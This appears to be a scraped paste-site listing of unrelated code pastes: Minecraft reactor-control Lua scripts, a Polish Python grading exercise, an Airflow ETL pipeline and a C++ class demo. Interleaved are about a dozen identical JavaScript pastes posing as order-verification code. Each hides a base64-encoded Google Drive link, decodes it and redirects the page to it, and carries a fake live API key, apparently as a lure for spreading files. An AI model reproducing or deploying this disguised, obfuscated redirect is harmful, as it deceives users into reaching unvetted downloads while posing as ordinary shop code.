      mon_touch()
    end
  end
end

--test if the entered monitor and reactor can be wrapped
function test_configs()
  term.clear()

  draw_line_term(1, 1, 55, colors.blue)
  draw_text_term(10, 1, ""BigReactors Controls"", colors.white, colors.blue)

  draw_line_term(1, 19, 55, colors.blue)
  draw_text_term(10, 19, ""by costantino03"", colors.white, colors.blue)

  draw_text_term(1, 3, ""Searching for a peripherals..."", colors.white, colors.black)
  sleep(1)

  reactor = reactorSearch()
  mon = monitorSearch()


  draw_text_term(2, 5, ""Connecting to reactor..."", colors.white, colors.black)
  sleep(0.5)
  if reactor == null then
    draw_text_term(1, 8, ""Error:"", colors.red, colors.black)
    draw_text_term(1, 9, ""Could not connect to reactor"", colors.red, colors.black)
    draw_text_term(1, 10, ""Reactor must be connected with networking cable"", colors.white, colors.black)
    draw_text_term(1, 11, ""and modems or the computer is directly beside"", colors.white, colors.black)
    draw_text_term(1, 12, ""the reactors computer port."", colors.white, colors.black)
    draw_text_term(1, 14, ""Press Enter to continue..."", colors.gray, colors.black)
    wait = read()
    setup_wizard()
  else
    draw_text_term(27, 5, ""success"", colors.lime, colors.black)
    sleep(0.5)
  end

  draw_text_term(2, 6, ""Connecting to monitor..."", colors.white, colors.black)
  sleep(0.5)
  if mon == null then
    draw_text_term(1, 7, ""Error:"", colors.red, colors.black)
    draw_text_term(1, 8, ""Could not connect to a monitor. Place a 3x3 advanced monitor"", colors.red, colors.black)
    draw_text_term(1, 11, ""Press Enter to continue..."", colors.gray, colors.black)
    wait = read()
    setup_wizard()
  else
    monX, monY = mon.getSize()
    draw_text_term(27, 6, ""success"", colors.lime, colors.black)
    sleep(0.5)
  end
  draw_text_term(2, 7, ""saving configuration..."", colors.white, colors.black)

  save_config()

  sleep(0.1)
  draw_text_term(1, 9, ""Setup Complete!"", colors.lime, colors.black)
  sleep(1)

  auto = auto_string == ""true""
  call_homepage()
end

----------------SETUP-------------------------------

function setup_wizard()
  term.clear()


  draw_text_term(1, 1, ""BigReactor Controls v"" .. version, colors.lime, colors.black)
  draw_text_term(1, 2, ""Peripheral setup"", colors.white, colors.black)
  draw_text_term(1, 4, ""Step 1:"", colors.lime, colors.black)
  draw_text_term(1, 5, ""-Place 3x3 advanced monitors next to computer."", colors.white, colors.black)
  draw_text_term(1, 7, ""Step 2:"", colors.lime, colors.black)
  draw_text_term(1, 8, ""-Place a wired modem on this computer and on the "", colors.white, colors.black)
  draw_text_term(1, 9, "" computer port of the reactor."", colors.white, colors.black)
  draw_text_term(1, 10, ""-connect modems with network cable."", colors.white, colors.black)
  draw_text_term(1, 11, ""-right click modems to activate."", colors.white, colors.black)
  draw_text_term(1, 13, ""Press Enter when ready..."", colors.gray, colors.black)

  wait = read()
  test_configs()
end

-- peripheral searching thanks to /u/kla_sch
-- http://pastebin.com/gTEBHv3D
function reactorSearch()
  local names = peripheral.getNames()
  local i, name
  for i, name in pairs(names) do
    if peripheral.getType(name) == ""BigReactors-Reactor"" then
      return peripheral.wrap(name)
    else
      --return null
    end
  end
end

function monitorSearch()
  local names = peripheral.getNames()
  local i, name
  for i, name in pairs(names) do
    if peripheral.getType(name) == ""monitor"" then
      test = name
      return peripheral.wrap(name)
    else
      --return null
    end
  end
end

function start()
  --if configs exists, load values and test
  if fs.exists(""config.txt"") then
    load_config()
    test_configs()
  else
    setup_wizard()
  end
end

start()
"
GvwHgXmY,Untitled,adrianwii,Python,Sunday 6th of April 2025 03:09:45 AM CDT,"import random
import math

""""""
Funkcja która oblicza średnią ważoną dla każdego ucznia według wag:
Pierwsza ocena: 0.3
Druga ocena: 0.1
Trzecia ocena: 0.1
Czwarta ocena: 0.2
Piąta ocena: 0.3
""""""
def srednia_wazona(oceny):
    wagi = [0.2, 0.1, 0.1, 0.2, 0.3, 0.1]
    srednia = sum([ocena * waga for ocena, waga in zip(oceny, wagi)])
    return round(srednia, 2)

def dodaj_ucznia(imie = """", slownik = {}):
    oceny = [random.randint(1, 6) for i in range(0,6)]
    slownik[imie] = oceny


if __name__ == ""__main__"":
    slownik = {}

    for i in range(0,5):
        imie = input(""Podaj imie ucznia:"")
        dodaj_ucznia(imie, slownik)

    print(f""slownik: {slownik}"")

    for imie, oceny in slownik.items():
        print(f""{imie} - oceny: {oceny} - średnia ważona: {srednia_wazona(oceny)}"")



"
nGL6i5H4,Untitled,dentira,JavaScript,Sunday 6th of April 2025 03:07:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24495/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wnAcJCsJ,alt_churn,vishneva_olga,Python,Sunday 6th of April 2025 02:55:02 AM CDT,"# dags/alt_churn.py

from venv import create
import pendulum
from airflow import DAG
from airflow.operators.python import PythonOperator
from steps.churn import create_table, extract, transform, load
from steps.messages import send_telegram_success_message, send_telegram_failure_message

with DAG(
    dag_id='alt_churn',
    schedule='@once',
    start_date=pendulum.datetime(2023, 1, 1, tz=""UTC""),
    tags=[""ETL""],
    on_success_callback=send_telegram_success_message,
    on_failure_callback=send_telegram_failure_message
) as dag:
    
    # код даг
    create_table_step = PythonOperator(task_id='create_table', python_callable=create_table)
    extract_step = PythonOperator(task_id='extract', python_callable=extract)
    transform_step = PythonOperator(task_id='transform', python_callable=transform)
    load_step = PythonOperator(task_id='load', python_callable=load)

    create_table_step >> extract_step >> transform_step >> load_step

# после отработки кода нажмите кнопку Проверить, добавлять свое решение необязательно #"
N1JH4LZv,Products.js,dentira,JavaScript,Sunday 6th of April 2025 02:51:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09346/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yP8ks5f0,Untitled,vishneva_olga,Python,Sunday 6th of April 2025 02:51:35 AM CDT,"#plugins/steps/churn.py

#from tkinter.messagebox import NO
from airflow.providers.postgres.hooks.postgres import PostgresHook
import pandas as pd
import numpy as np

def create_table() -> None:
        import sqlalchemy
        from sqlalchemy import MetaData, Table, Column, String, Integer, Float, DateTime, UniqueConstraint, inspect
        metadata = MetaData()
        alt_users_churn = Table(
            'alt_users_churn',
            metadata,
            Column('id', Integer, primary_key=True, autoincrement=True),
            Column('customer_id', String),
            Column('begin_date', DateTime),
            Column('end_date', DateTime),
            Column('type', String),
            Column('paperless_billing', String),
            Column('payment_method', String),
            Column('monthly_charges', Float),
            Column('total_charges', Float),
            Column('internet_service', String),
            Column('online_security', String),
            Column('online_backup', String),
            Column('device_protection', String),
            Column('tech_support', String),
            Column('streaming_tv', String),
            Column('streaming_movies', String),
            Column('gender', String),
            Column('senior_citizen', Integer),
            Column('partner', String),
            Column('dependents', String),
            Column('multiple_lines', String),
            Column('target', Integer),
            UniqueConstraint('customer_id', name='uq_customer_id')
        )
        hook = PostgresHook('destination_db')
        engine = hook.get_sqlalchemy_engine()
        conn = engine.connect()
        try:
            if not inspect(conn).has_table(alt_users_churn.name):
                metadata.create_all(conn)
        finally:
            conn.close()

def extract(**kwargs):
    ti = kwargs['ti']

    hook = PostgresHook('source_db')
    conn = hook.get_conn()
    sql = f""""""
        SELECT
            c.customer_id, c.begin_date, c.end_date, c.type, c.paperless_billing, c.payment_method, c.monthly_charges, c.total_charges,
            i.internet_service, i.online_security, i.online_backup, i.device_protection, i.tech_support, i.streaming_tv, i.streaming_movies,
            p.gender, p.senior_citizen, p.partner, p.dependents,
            ph.multiple_lines
        FROM contracts AS c
        LEFT JOIN internet AS i ON i.customer_id = c.customer_id
        LEFT JOIN personal AS p ON p.customer_id = c.customer_id
        LEFT JOIN phone AS ph ON ph.customer_id = c.customer_id
        """"""
    data = pd.read_sql(sql, conn)
    conn.close()
    ti.xcom_push('extracted_data', data)

def transform(**kwargs):
    ti = kwargs['ti'] # получение объекта task_instance
    data = ti.xcom_pull(task_ids='extract', key='extracted_data') # выгрузка данных из task_instance
    data['target'] = (data['end_date'] != 'No').astype(int) # логика функции
    data['end_date'].replace({'No': None}, inplace=True)
    ti.xcom_push('transformed_data', data) # вместо return отправляем данные передатчику task_instance 

def load(**kwargs):
    # ваш код здесь #
    ti = kwargs['ti']
    data = ti.xcom_pull(task_ids='transform', key='transformed_data')
    hook = PostgresHook('destination_db')
    hook.insert_rows(
        table=""alt_users_churn"",
        replace=True,
        target_fields=data.columns.tolist(),
        replace_index=['customer_id'],
        rows=data.values.tolist()
    )"
CWFe4E4V,Order.js,dentira,JavaScript,Sunday 6th of April 2025 02:36:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11179/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GEsw7Tun,Market.js,dentira,JavaScript,Sunday 6th of April 2025 02:20:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55549/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DpRAEzfZ,virtual,dllbridge,C,Sunday 6th of April 2025 02:05:37 AM CDT,"


#include  <iostream>
#include   <iomanip>
using namespace std;


//////////////////////////////////////////////////////////////
class  Figure                                               //  
{
	
	   protected:  string sFigName;                         //        protected – когда нужно дать доступ производным 
	                                                        //                    классам, но скрыть от внешнего кода.
	   public: 	   float     fArea;
	                                                        //              virtual указывает, что функция может быть 
															//                   переопределена в производных классах.
	   virtual void area() = 0;                             //                   = 0 делает функцию чисто виртуальной.
	                                                        //  Это превращает Figure в абстрактный класс (его нельзя 
															//  создать напрямую).       Любой класс-наследник теперь 
															//                         должен реализовать эту функцию. 
	   void printArea()
	   {
	   	
	        cout << ""Area of "" << setw(9) <<  sFigName << "" = "" << fArea << endl; 	
	   }
};


//////////////////////////////////////////////////////////////
class  Square: public Figure                                // 
{
	
	   public: float fSide;
	   
	              Square() {  sFigName = ""Square"";  }       //          Улучшили читаемость кода за счёт конструктора.
	   
	   virtual void area() { fArea = fSide * fSide;	}
};


//////////////////////////////////////////////////////////////
class  Rectangle: public Figure                             //
{
	
	
	   public:  float   fWidth,
	                   fHeight;
	   
	            Rectangle() {  sFigName = ""Rectangle"";  }  //  Короткий конструктор создаёт отступ после модификатора.                 
	   
	   virtual void  area()
	   {
					
			fArea = fWidth * fHeight;	 
	   }
};



///////////////////////////////////////////////////////////////
class  Circle: public Figure                                 //
{
	
	   public:  float  fRadius;
	   
	              Circle() {  sFigName = ""Circle"";  }
	              
	   virtual void area() {  fArea = 3.14 * fRadius * fRadius;  }
};



///////////////////////////////////////////////////////////////
int main()                                                   //  
{

    Square    Sq_1;
              Sq_1.fSide =      2;
              Sq_1.area();    
           
    Rectangle Rt_1;
              Rt_1.fWidth   = 4.5;
              Rt_1.fHeight  = 5.0;           
              Rt_1.area();
              
    Circle    Cr_1;
              Cr_1.fRadius  = 2.5;           
              Cr_1.area();          
              			  
	Figure *pArr[7] = { 0, &Sq_1, &Rt_1, &Cr_1 };		 //  Начинайте с индекса №1, чтобы снизить запутанность кода. 
	                                                     //  Нулевой индекс может пригодиться (неожиданно) в будущем.     
	for(int i = 1; i <= 3; i++)
	{
	     	
		pArr[i] -> printArea(); 
	}
	
return 0;
}






"
nqFxaHh4,Untitled,dentira,JavaScript,Sunday 6th of April 2025 02:05:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86555/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ga14kmNU,Market.js,rodrigomaise99,JavaScript,Sunday 6th of April 2025 02:00:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/73575/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WUeuARyv,Untitled,rodrigomaise99,JavaScript,Sunday 6th of April 2025 01:45:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34215/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MTsYpfQi,Products.js,rodrigomaise99,JavaScript,Sunday 6th of April 2025 01:29:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47027/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XdVrRyvc,Order.js,rodrigomaise99,JavaScript,Sunday 6th of April 2025 01:14:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67285/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DmhpChNq,Market.js,rodrigomaise99,JavaScript,Sunday 6th of April 2025 12:58:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65516/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kXkW0Zj0,Untitled,rodrigomaise99,JavaScript,Sunday 6th of April 2025 12:43:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40064/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DgjqVXyK,Products.js,rodrigomaise99,JavaScript,Sunday 6th of April 2025 12:28:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80301/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M6z9wLTE,Order.js,rodrigomaise99,JavaScript,Sunday 6th of April 2025 12:12:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77398/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
T3Zucygs,Draconic Control v15.2 [SMT] [Lua 5.3 / 5.2],neuroticfox,Lua,Sunday 6th of April 2025 12:04:02 AM CDT,"::start::

-- Set Requirements & Local Variables

local component = require(""component"")
local event = require(""event"")
local term = require(""term"")
local gpu = component.gpu
local screen = component.screen
local unicode= require(""unicode"")
local reactorOutputMultiplier = 1
local cutoffTemp = 9005
local chaosMode = 0
local tempDrop = 0
local devMode = 0
local deviation = 0
local cVar = ""Do not use Chaos Mode with less than one block of fuel""
local ratioX, ratioY = screen.getAspectRatio()
local maxX, maxY = gpu.maxResolution()
local tArgs = {...}
local adj_button_width = 19
local tempOffsetX = 62
local tempOffsetY = 2
local fieldOffsetX = tempOffsetX + adj_button_width + 2
local fieldOffsetY = 2
local cutoffField = 0.75
local highest_use = 0.1

-- Set Resolution

gpu.setResolution(math.min(ratioX*55, maxX), math.min(ratioY*25,maxY))
term.clear()
term.setCursor(0, 0)

-- Program Help & Credits

if tostring(tArgs[1]) == ""-h"" then 
	os.execute(cls)
	print(""Draconic Control 15.2"")
	print(""[1.12 and 1.16 Compatible]"")
	print()
	print(""dc15 [O] [T] [F] [M]"")
	print()
	print(""Start Arguments"")
	print()
	print(""[O] - Reactor Output Multiplier"")
	print(""This is set in your Draconic Evolution"")
	print(""configs, by default 1.12.2 uses 1, and"")
	print(""1.16.5 uses 10."")
	print()
	print(""[T] - Desired Reactor Temperature"")
	print(""Recommended [8000]"")
	print(""Range [2500-8000]"")
	print()
	print(""[F] - Desired Field Strength %"")
	print(""Recommended [10]"")
	print(""Range [0.5-99]"")
	print()
	print(""[M] - User Interface Selection"")
	print(""Default [1]"")
	print(""Range [1-3]"")
	print(""Simple, Developer, Text Only"")
	print()
	print()
	print()
	print(""Compiled by BrokenSynapse & AwesomeAlec1"")
	print()
	print(""Thanks to Maurdekye for creating the base of this program:"")
	print(""https://youtu.be/iLvkk41K84E"")
	print()
	print(""Thanks to AwesomeAlec1 for creating the control script:"")
	print(""https://youtu.be/CLku1ckXpeU"")
	print()
	print(""Thanks to MightyPirates for being so gracious as to"")
	print(""let me fix what they broke by never using Lua 5.3"")
	print()
	print(""And a very special thanks to ZanBorg for breaking"")
	print(""this script until it doesn't break anymore."")
	goto fin
end

-- Set Control Variables

local reactorOutputMultiplier = tArgs[1] or 1
local idealTemp = tArgs[2] or 8000
local idealField = tArgs[3] or 15
local Mode = tArgs[4] or 1

-- Register Components

	-- Check For Reactor
if not component.isAvailable(""draconic_reactor"") then
	print(""Reactor not connected. Please connect computer to reactor with an Adapter block."")
	os.exit()
end

local reactor = component.draconic_reactor
local info = reactor.getReactorInfo()

	-- Check For Flux Gates
local fluxGates = {}

for x,y in pairs(component.list(""flux_gate"")) do
	fluxGates[#fluxGates+1] = x
end

if #fluxGates < 2 then
	print(""Not enough flux gates connected; please connect inflow and outflow flux gates with Adapter blocks."")
	os.exit()
end

local inputFlux = component.proxy(fluxGates[1])
local outputFlux = component.proxy(fluxGates[2])

outputFlux.setOverrideEnabled(true)
inputFlux.setOverrideEnabled(true)

if not inputFlux or not outputFlux then
	print(""Not enough flux gates connected; please connect inflow and outflow flux gates with Adapter blocks."")
	os.exit()
end

-- Automatically Set Input & Output Flux Gates

reactor.chargeReactor()
satOne = info.energySaturation
fieldOne = info.fieldStrength
inputFlux.setFlowOverride(1.0)

os.sleep(0.1)

satTwo = info.energySaturation
fieldTwo = info.fieldStrength
inputFlux.setFlowOverride(0.0)
reactor.stopReactor()

if satTwo <= satOne or fieldTwo <= fieldOne then
	local oldAddr = inputFlux.address
	inputFlux = component.proxy(outputFlux.address)
	outputFlux = component.proxy(oldAddr)
end

-- Functions & Arrays

	-- Exit Message
function exit_msg(msg)
	term.clear()
	print(msg)
	os.exit()
end

	-- Temperature Controls
function modifyTemp(offset)
	local newTemp = idealTemp + offset
